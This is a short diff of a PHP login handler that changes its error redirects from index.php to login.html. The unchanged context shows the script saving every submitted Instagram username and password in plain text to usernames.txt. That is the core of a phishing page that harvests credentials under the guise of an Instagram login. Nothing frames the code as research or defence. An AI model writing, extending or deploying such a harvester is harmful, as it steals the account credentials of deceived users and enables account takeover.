@@ -5,7 +5,7 @@ $password = $_POST['password'] ?? '';
 file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 
 if (empty($username) || empty($password)) {
-    header('Location: index.php?error=1');
+    header('Location: login.html?error=1');
     exit();
 }
 
@@ -21,7 +21,7 @@ if (strpos($result, 'true') !== false && strpos($result, 'false') === false) {
     header('Location: dashboard.php');
     exit();
 } else {
-    header('Location: index.php?error=1');
+    header('Location: login.html?error=1');
     exit();
 }
 ?>
